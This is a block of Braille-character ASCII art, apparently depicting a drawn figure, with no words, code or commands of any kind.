⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠈⢆⠀⠀⠀⠀⠀⢑⠞⠤⣠⣇⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣀⡠⠤⢤⢤⠴⠃⠀⡀⠔⠊⠀⠠⢹⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢺⠀⠀⠀⠣⡀⠀⠀⡤⠃⠠⣼⠃⢳⠈⠉⠉⣍⠉⠉⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⡜⢸⢀⡔⠉⠀⢀⡠⢔⠊⠉⠻⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡦⡀⠀⠀⠈⠑⠺⠤⣴⠟⠃⠀⠸⡆⠐⠀⢸⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⢀⠃⢸⡃⣇⠀⡰⠟⠂⠁⠀⠀⠀⠙⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢄⠀⠀⠀⠈⠺⠦⣄⣠⠤⠴⠊⠉⠀⠀⠀⡼⠁⠀⠐⢸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢘⠀⠀⠀⢸⠀⢸⣇⠞⠉⠀⠀⠀⠀⢀⡠⠐⠀⠈⢣⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡜⠈⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢿⣁⠀⠈⢀⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡈⢀⠀⠀⠰⠀⢸⠹⡄⠀⠀⢀⡠⠒⠁⠀⠀⠀⡠⠀⢳⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢜⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣴⠋⠀⠈⠉⠓⠦⠄⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⣿⡯⠀⠀⠀⣆⣼⡆⢙⣤⡐⠁⠀⠀⠀⡠⠔⠉⠀⠀⠀⠹⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢂⡠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⢾⠁⠉⠢⢄⡀⠀⠀⠀⠀⠈⠉⠁⠐⠒⠒⠒⠒⠒⠚⠓⠀⠈⠉⠀⠀⢧⠀⠘⢷⣀⡠⠔⠉⠀⠀⠀⠀⢀⠠⠀⠱⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠚⡱⠁⠀⠀⠀⠀⠈⠁⠒⠠⠤⢀⣀⣀⢀⠀⡀⢀⢀⡀⠀⠀⣀⡠⠔⠒⠂⠙⣆⠀⠀⠙⣦⠀⠀⠀⢀⠄⠊⠁⠀⠀⡀⠘⣄⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠜⢡⠊⠀⠀⠀⠀⠀⠀⠀⣰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⠰⡄⠀⠹⡄⠀⠀⠀⠳⡄⠐⠁⠀⠀⢀⠔⠉⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠋⡔⠁⠀⠀⠀⠀⠀⠀⠀⣰⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠀⠀⠀⠀⠀⠀⣷⠀⠀⠹⡄⠀⠀⠀⠈⢷⣀⡠⠚⠁⠀⠀⢀⠄⠢⡀⠣⣀⠀⠀⠀⢀⣀⣤⣤⣄⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢀⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡰⢁⠎⠀⠀⠀⠀⠀⠀⠀⠀⢰⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⡄⣹⡄⠀⠀⠀⠀⠀⠀⠀⡇⡆⠀⠀⢳⠀⠀⠀⠀⠈⠙⢵⠀⠀⢀⠕⢁⠖⡠⠁⠀⠉⡖⠚⠉⠩⢿⡟⣿⣭⣷⣄⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡘⠘⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡘⢡⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⡆⡎⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⣜⢣⠀⠀⠀⠀⠀⠀⠀⢹⠸⡀⠀⠐⢇⠀⠀⠀⠀⠀⠀⠑⢶⡁⠀⢸⡔⠁⠀⢠⠃⢁⠀⠀⠀⠒⣿⡽⣶⢾⣿⣷⣄⠀
⠀⠀⠀⠀⠀⠀⢰⠇⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢰⢣⠇⡄⠀⠀⠀⠀⠀⠀⠀⠀⢸⢠⠇⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⢸⠀⠀⠀⠀⠀⠀⠀⠸⠀⡇⠀⠀⠸⡆⠀⠀⠀⠀⠀⠀⠘⢿⣦⣾⠀⠀⠀⡇⠀⢸⠀⠀⠀⠀⢸⣿⣷⣿⡿⣿⣿⣧
⠀⠀⠀⠀⠀⠀⢎⠀⠀⠀⡷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⡌⡘⠀⠀⠀⠀⠀⠀⠀⠀⠀⡸⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⡇⠀⠀⠄⠀⠀⠀⠀⡇⢸⠀⠀⠀⢳⠀⠀⠀⠀⠀⠀⠀⠀⠹⣴⠀⠀⡜⠀⠀⢘⣲⣄⣀⣈⣸⠿⢿⣯⣿⣽⣞⣿
⠀⠀⠀⠀⠀⠀⠀⢣⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠏⡸⢠⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⡸⢰⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⡇⠀⠀⠀⠀⠀⠀⠀⢸⠈⡇⠀⠀⠈⢇⠀⠀⠀⠀⠀⠀⠀⠀⠸⠓⣜⠂⠀⣴⣿⣿⣷⣾⣯⣿⣦⠈⠉⠛⠻⠞⠉
⠀⠀⠀⠀⠀⠀⠀⠀⠙⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣄⡇⢜⡀⠤⣀⠀⠀⠀⠀⠀⠀⠀⡇⢓⠨⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣇⠀⠀⠀⠀⠀⠀⠀⠈⡆⢥⠀⠀⠀⠘⡆⠀⠀⠀⠀⠀⠀⠀⠨⠀⠀⠓⢦⢿⣿⣿⣾⣷⣿⣿⡿⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣀⠈⠑⠀⠦⠤⠄⠀⠀⠀⠀⣇⣽⠀⠀⠄⠀⠀⠀⠀⠀⠀⠒⠈⢸⠂⡏⠀⠠⠀⠀⠀⠀⠐⠀⠇⢸⠄⣀⣀⠀⠘⡄⠀⠀⠀⠀⠀⠀⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠉⠒⣶⠤⠤⠤⠤⠤⠶⠖⠛⠉⠲⠤⣄⣀⣀⣀⢀⣀⣀⣤⣤⣼⣿⣧⣈⠉⠐⠒⠂⠀⠀⠀⢸⡻⠦⠤⣤⠤⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣹⡀⠀⢠⣀⣤⠴⠖⠛⠋⠉⠉⠉⣩⡥⠬⠥⣬⣉⣹⡏⠉⠉⠉⠉⠉⠉⠒⠒⠒⠚⠿⠥⢤⣀⡀⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠩⡗⠚⠉⣀⠠⠤⠒⠒⠀⠀⠀⠉⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠉⠉⠉⠉⠁⠉⠁⠀⠀⠀⠒⠤⢩⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠂⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡗⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢳⠐⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⠀⢰⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣤⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠉⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠛⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠠⡟⡆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠃⠀⠘⡄⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣰⠋⢸⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⡀⢨⡇⠀⠀⠀⠀⠐⠀⠀⠀⠀⠀⠀⠀⢈⡰⢯⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⡇⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⠴⠋⠀⢀⣸⣄⠇⠈⠢⢄⠀⠀⠀⠀⠀⠀⠀⠀⠠⠁⢸⢧⠀⠀⠀⠀⠀⠀⡀⠀⠀⢀⠔⠁⠊⠁⠈⢣⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠐⡄⠀⣠⠋⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠠⠀⠀⢠⡤⠖⠋⠁⠀⠀⠠⢀⡿⠉⠙⠢⠤⠀⣉⠒⠤⣀⠀⠀⠀⠀⠀⠀⡿⢸⡀⠀⠀⠀⠀⠀⡀⠠⢖⠍⠀⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣤⠃⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⠤⠓⠋⠀⠀⠀⡀⠤⠀⠂⣠⠞⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⠁⠀⠀⠀⠀⢠⠇⣈⣇⠀⠀⠀⠀⠁⠀⠀⠀⠀⠀⠀⢀⠠⠂⠀⡄⠹⡀⠀⠀⠀⠀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠈⢀⠀⠠⠐⡴⢡⠂⠁⠂⠤⣤⣀⠀⠀⠀⠈⠢⠀⠀⠀⠀⠀⡼⠀⣼⢹⡀⠀⠀⠀⠀⢀⡠⠤⠏⠁⠀⠀⠀⠀⠀⣰⠀⢷⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠔⠋⠀⠀⠀⠀⠀⠀⡀⠁⠀⠂⠀⠄⡜⢀⠂⠀⠀⠀⠀⠀⠀⠀⠀⠉⠂⠲⡄⠤⠀⢠⡼⠁⢀⡟⠀⣧⠐⠒⠒⠽⠋⠁⠀⠀⠀⠀⡠⠤⠎⠁⠁⠀⠸⡀⠀⠀⠀⡀⠀⡠⠊⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⠞⠁⠀⠀⠀⠀⠀⠀⠀⠄⠀⡀⠁⢀⠂⡸⠀⠀⠈⠒⢤⡀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⢀⡾⠁⣾⣸⠁⠀⡟⡆⠀⠀⡠⠖⠒⠚⠉⠉⠀⠀⠀⠀⠀⠀⠀⢀⡇⠀⠀⠀⢀⠝⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⡴⠁⠀⠀⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠐⠀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠉⠓⠢⢤⣀⢠⣃⣀⢀⡞⢁⡼⠛⠃⠀⣱⠁⢻⠈⠁⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡠⠒⠀⡇⠀⠀⡠⠋⠈⠀⠀⢀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢠⣎⣠⡶⠗⠀⠀⠀⠀⠀⠀⠄⠀⠀⠀⠁⠠⠈⢰⡇⠉⠂⢄⡀⠀⠀⠀⠀⠀⠀⠀⢁⠂⠀⢀⡟⠠⠞⠀⠠⡄⣱⠃⠀⠈⣇⣀⣀⡤⠆⠂⠂⠂⠂⠒⠉⠁⠁⠀⠀⠀⡇⢀⠎⠀⠀⠀⠀⠀⠁⠀⢠⢦⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢚⣷⡾⠁⠀⠀⠀⠀⠀⠀⢀⠀⠀⠁⠠⠈⠀⠄⢸⣇⠀⠀⠀⠀⠁⠂⠠⢀⠀⠀⠀⠎⠀⢀⡞⠀⠠⠀⠂⣽⣻⠃⠀⠀⠀⠘⣆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡀⡠⠚⠀⣧⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⢣⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⣠⢾⣿⠇⠀⠀⠀⠀⠀⠀⢀⠀⠀⠈⠀⠄⠐⠀⠠⢸⠁⠑⠤⢀⣀⠀⠀⠀⠀⠀⠀⠉⠀⢀⡏⠀⠐⠀⣡⢾⡟⠁⠀⠀⠀⠀⠀⠻⡄⠀⠀⠀⠀⣀⡤⠔⠋⠉⠀⠀⠀⠀⡟⠀⠀⠀⠀⠀⠀⠀⠀⠘⡄⢠⠎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⣰⠃⣯⢾⠀⢀⣴⡟⠀⠀⠀⠀⡀⠈⠀⠄⠀⠂⠈⢀⢸⠀⠀⠀⠀⠀⠀⠁⠑⠢⣀⡀⠀⢠⠟⠀⣈⣤⠞⠁⠈⠀⠀⠀⠀⠀⠀⠀⠀⢳⠐⠒⠊⠉⠀⠀⠀⠀⠀⠀⠀⢀⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⣰⠃⠀⣷⣿⣴⣟⡿⠁⠀⠀⣀⣁⠀⠀⠐⠀⡈⠀⢁⠀⣼⠄⣀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢳⣎⣠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢧⠀⠀⠀⠀⢀⣀⣀⡀⠤⠂⠁⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⢠⠃⠀⠀⠉⢁⣼⡿⢶⣞⡿⣿⣿⡏⠀⠈⡀⠐⠀⢈⠀⣼⢹⠦⠀⠁⠂⠤⣀⠀⠀⠀⠀⠀⡾⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠚⣏⠁⠉⠉⠀⠀⠀⠀⠀⠀⠀⣸⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⡞⠀⠀⠀⠀⠞⠛⠛⠉⢁⣿⡿⣿⠁⣀⡐⢂⠄⢈⡆⢠⠇⣼⠀⠀⠀⠀⠀⠀⠀⠉⠐⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠸⡄⠀⠀⠀⠀⠀⣀⡤⠄⠊⠹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢰⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣼⡟⠁⢃⣤⣿⣷⠋⠐⣿⠈⠁⠀⠀⠀⠀⠀⠀⠀⡸⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⡒⠋⠉⠉⠉⠁⠀⠀⠀⢀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⡿⢋⣿⢁⣴⣾⣿⣿⣟⣠⠟⡏⠀⠀⠀⠀⠀⠀⠀⠀⢠⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢣⠀⠀⠀⠀⠀⠀⢀⡀⠠⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⡏⠀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⡰⠘⣯⣼⣿⠟⣿⣿⠟⠁⣸⠁⠒⠠⢀⡀⠀⠠⠈⢀⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣸⡧⠖⠒⠒⠁⠉⠁⠀⠀⢻⠄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⣧⠀⣴⡇⠀⢰⠀⠀⠀⢀⠀⡜⠀⠀⠹⡏⢁⣴⠛⠁⠀⢠⠇⠀⠀⠀⠀⠀⠜⠁⠀⡜⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠰⣧⢹⣒⣒⠶⠶⢦⡤⠝⠛⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⢹⠞⢠⡁⠀⢷⠀⠀⢀⠎⠸⠀⠀⠀⢀⣴⠋⠁⠀⠀⢀⠏⠈⠉⠀⠀⢀⣀⠀⠤⠐⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡼⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⢆⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠈⠸⡇⠀⠈⠆⢀⠇⠀⠁⠀⣼⢠⡞⡁⠀⠀⠀⢀⠏⠀⠀⠀⠚⠛⠂⠀⠀⠀⢀⡞⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡇⣀⠀⠀⢀⣀⣀⣀⣀⠠⠄⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠹⡄⠀⠈⠚⠂⠀⠀⣴⣿⡎⠀⠀⠀⠀⠀⡞⠀⠀⠐⠒⠐⠀⠀⠀⠀⠈⠀⢧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⠧⠀⠀⠀⠀⠀⠀⠀⠀⠀⡂⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠙⢄⠀⠀⠀⠀⠀⡇⠈⠀⠀⠀⠀⠀⠈⢳⠀⠀⠀⠀⢀⠀⠀⠤⠄⠒⠂⠨⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⠈⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢹⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠙⠢⢤⣀⡀⢳⢀⣀⣠⠤⠤⠤⠤⠬⡇⠒⠈⠉⠀⠀⠀⠀⠀⠀⢀⠀⠘⣆⢀⣀⠀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣠⠤⠂⠈⠙⠁⡀⠄⢂⠐⡀⠆⠐⣻⠀⠀⢀⡀⠄⠐⠂⠉⢀⣀⣀⣠⣼⣦⣤⣂⠐⠐⡈⠐⢂⠁⠒⠠⢁⠂⠌⢉⠑⢦⠀⣠⠤⠴⠾⢲⠶⠶⠤⠤⢤⣀⣀⠒⠀⠤⠀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠳⠤⣌⣌⣠⠁⡐⠈⠄⢂⠐⡈⠄⣹⡖⠀⣀⣠⣦⣶⣿⣿⣭⣽⣶⣷⣽⣶⣬⣭⡳⣥⠀⠡⠀⠌⠠⢁⠂⠌⡀⠂⠌⢀⣾⣥⣶⣶⣿⣿⢿⡿⣿⣿⣿⣿⣮⣽⣿⣶⣄⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⡤⠌⠐⡀⢂⠐⠠⢈⣷⣿⣿⣿⣟⡿⣽⣻⣿⣟⡷⣯⣟⣿⣿⣟⣿⣿⠇⠠⢁⠈⡐⠠⠈⠄⠠⢁⠂⣼⣿⣯⣷⣻⣿⣽⢯⣟⣷⣿⣟⣾⣽⣻⣟⡿⣿⡧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⠦⣌⡐⢀⠂⡈⠐⡀⠻⣿⣿⣿⣾⣿⣿⣽⣯⣿⣟⣷⣿⣾⣿⣿⣿⡿⠀⡁⠂⡐⠠⠁⠌⠠⠁⠂⠄⡈⢿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣾⣷⣿⣾⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠉⠑⠒⠃⠐⠤⠀⠙⠛⠿⠿⣿⣿⣿⣿⠿⠿⠟⠛⢋⠉⡀⠄⢂⠐⠠⠐⠠⠁⠌⠠⠁⠌⠠⠐⡀⠈⠉⠛⠛⠟⠻⠟⠟⠻⠛⠛⠛⠛⠉⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
